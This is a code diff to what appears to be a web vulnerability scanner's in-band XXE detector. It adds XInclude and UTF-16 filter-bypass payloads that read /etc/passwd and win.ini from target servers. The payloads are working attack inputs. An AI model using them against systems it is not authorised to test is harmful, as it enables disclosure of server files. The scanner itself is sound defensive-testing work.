@@ -2,7 +2,16 @@
 
 The OAST rule (``xxe-oob``) catches *blind* XXE by making the parser fetch a collaborator URL. This
 detector catches the **in-band** case the collaborator can't: a parser that resolves an external
-``SYSTEM`` entity and reflects its content, so the file we asked for comes straight back in the response.
+reference and reflects its content, so the file we asked for comes straight back in the response.
+
+Three delivery techniques share one oracle (see ``_STRATEGIES``):
+
+* **Classic SYSTEM entity** — ``<!DOCTYPE .. [<!ENTITY x SYSTEM "file:///etc/passwd">]>``.
+* **XInclude** — reads a file *without a DOCTYPE* (``<xi:include parse="text" href=.../>``), so it
+  still fires when the parser (or a filter) forbids DOCTYPE declarations.
+* **UTF-16 encoding bypass** — the classic payload sent as UTF-16 (with BOM) for raw-XML bodies,
+  slipping past filters that only match the UTF-8 DOCTYPE/entity byte pattern; the parser
+  auto-detects the encoding from the BOM.
 
 It targets only requests that already speak XML — an ``application/xml`` content type, or a body value
 that is itself an XML document — so it never sprays XML at JSON/form endpoints. Zero false positives: a
@@ -14,6 +23,7 @@ it must reproduce.
 from __future__ import annotations
 
 import re
+from collections.abc import Callable
 from urllib.parse import urlsplit
 
 import httpx
@@ -25,6 +35,9 @@ from dastcore.engine.rule_engine import build_mutated_request
 
 _MAX_POINTS = 24
 
+# Builds an XML payload that references `target` (a file:// URI).
+PayloadBuilder = Callable[[str], str]
+
 # The files we try to read out-of-the-parser via an external SYSTEM entity. Unix first, then Windows.
 _XXE_TARGETS = ("file:///etc/passwd", "file:///c:/windows/win.ini", "file:///c:/Windows/win.ini")
 
@@ -34,6 +47,15 @@ def _payload(target: str) -> str:
         '<?xml version="1.0" encoding="UTF-8"?>'
         f'<!DOCTYPE dcroot [<!ENTITY dcxxe SYSTEM "{target}">]>'
         "<dcroot>&dcxxe;</dcroot>"
+    )
+
+
+def _xinclude_payload(target: str) -> str:
+    """Read a file with *no DOCTYPE* via XInclude — fires even when DOCTYPE is forbidden/stripped."""
+    return (
+        '<?xml version="1.0" encoding="UTF-8"?>'
+        '<dcroot xmlns:xi="http://www.w3.org/2001/XInclude">'
+        f'<xi:include parse="text" href="{target}"/></dcroot>'
     )
 
 
@@ -65,7 +87,14 @@ def _match_signature(text: str) -> tuple[str, str] | None:
     return None
 
 
-def _finding(point: InjectionPoint, request: HttpRequest, response: HttpResponse, label: str, snippet: str) -> Finding:
+def _finding(
+    point: InjectionPoint,
+    request: HttpRequest,
+    response: HttpResponse,
+    label: str,
+    snippet: str,
+    technique: str = "SYSTEM entity",
+) -> Finding:
     path = urlsplit(request.url).path or "/"
     where = f"{point.location}:{point.name}"
     return Finding(
@@ -82,8 +111,9 @@ def _finding(point: InjectionPoint, request: HttpRequest, response: HttpResponse
             Evidence(
                 type="response_match",
                 data=(
-                    f"una entidad externa SYSTEM ({where}) hizo que el parser leyera {label} y lo "
-                    f"devolviera en la respuesta: «{snippet}» — XXE in-band (lectura de ficheros del servidor)"
+                    f"una referencia externa XML por {technique} ({where}) hizo que el parser leyera "
+                    f"{label} y lo devolviera en la respuesta: «{snippet}» — XXE in-band (lectura de "
+                    "ficheros del servidor)"
                 )[:200],
                 confidence="high",
             )
@@ -98,17 +128,34 @@ def _finding(point: InjectionPoint, request: HttpRequest, response: HttpResponse
     )
 
 
-async def xxe_send(client: HttpClient, point: InjectionPoint, xml: str) -> HttpResponse | None:
+# Delivery techniques, tried in order per target: (human label, payload builder, byte encoding).
+# The UTF-16 encoding bypass only applies to a raw XML body (the ``xml-document`` point) — an
+# injected string value can't carry its own charset.
+_STRATEGIES: tuple[tuple[str, PayloadBuilder, str | None], ...] = (
+    ("SYSTEM entity", _payload, None),
+    ("XInclude (sin DOCTYPE)", _xinclude_payload, None),
+    ("SYSTEM entity + UTF-16", _payload, "utf-16"),
+)
+
+
+async def xxe_send(
+    client: HttpClient, point: InjectionPoint, xml: str, *, encoding: str | None = None
+) -> HttpResponse | None:
     """Deliver an XXE document to ``point``: as the raw request body for an XML endpoint (the synthetic
     ``xml-document`` point), or injected as the value of a body/JSON point that parses XML. Session-aware.
-    Shared by the detector and the proof-of-impact escalation so both send exactly the same way."""
+    ``encoding`` (e.g. ``"utf-16"``) sends the raw body as those bytes with a matching charset, for the
+    encoding-bypass technique. Shared by the detector and the proof-of-impact escalation."""
     try:
         if point.location == "body" and point.name == "xml-document":
             request = point.request_template
             headers = {k: v for k, v in (request.headers or {}).items() if k.lower() != "content-type"}
-            headers["Content-Type"] = "application/xml"
+            charset = encoding if encoding else "utf-8"
+            headers["Content-Type"] = f"application/xml; charset={charset}"
             method = request.method if request.method in ("POST", "PUT", "PATCH") else "POST"
-            return await client.request(method, request.url, headers=headers, content=xml)
+            content: str | bytes = xml.encode(encoding) if encoding else xml
+            return await client.request(method, request.url, headers=headers, content=content)
+        if encoding is not None:
+            return None  # an injected string value can't carry a UTF-16 BOM/charset
         req = build_mutated_request(point, xml)
         return await client.request(
             req.method, req.url, params=req.params or None, headers=req.headers or None,
@@ -118,24 +165,36 @@ async def xxe_send(client: HttpClient, point: InjectionPoint, xml: str) -> HttpR
         return None
 
 
-async def read_file_via_xxe(client: HttpClient, point: InjectionPoint, target: str) -> tuple[str, str] | None:
-    """Try to read ``target`` (a ``file://`` URI) through an external-entity payload on ``point``.
+async def read_file_via_xxe(
+    client: HttpClient,
+    point: InjectionPoint,
+    target: str,
+    *,
+    builder: PayloadBuilder = _payload,
+    encoding: str | None = None,
+) -> tuple[str, str] | None:
+    """Try to read ``target`` (a ``file://`` URI) through an external-reference payload on ``point``.
     Returns ``(sensitive-file label, snippet)`` when the response reflects a known sensitive-file
     signature, else None. The building block for both detection and impact escalation."""
-    resp = await xxe_send(client, point, _payload(target))
+    resp = await xxe_send(client, point, builder(target), encoding=encoding)
     return _match_signature(resp.text) if resp is not None else None
 
 
 async def _probe(client: HttpClient, point: InjectionPoint) -> Finding | None:
-    """Try each file target on ``point`` and report the first that reflects a sensitive file; reproduce."""
+    """Try each file target × delivery technique on ``point``; report the first sensitive-file hit that
+    reproduces. The technique that worked is recorded in the finding's evidence."""
+    is_raw_body = point.location == "body" and point.name == "xml-document"
     for target in _XXE_TARGETS:
-        hit = await read_file_via_xxe(client, point, target)
-        if hit is None:
-            continue
-        confirm = await read_file_via_xxe(client, point, target)
-        if confirm is not None:
-            label, snippet = hit
-            return _finding(point, point.request_template, HttpResponse(status_code=200), label, snippet)
+        for technique, builder, encoding in _STRATEGIES:
+            if encoding is not None and not is_raw_body:
+                continue  # encoding bypass only applies to a raw XML body
+            hit = await read_file_via_xxe(client, point, target, builder=builder, encoding=encoding)
+            if hit is None:
+                continue
+            confirm = await read_file_via_xxe(client, point, target, builder=builder, encoding=encoding)
+            if confirm is not None:
+                label, snippet = hit
+                return _finding(point, point.request_template, HttpResponse(status_code=200), label, snippet, technique)
     return None
 
 
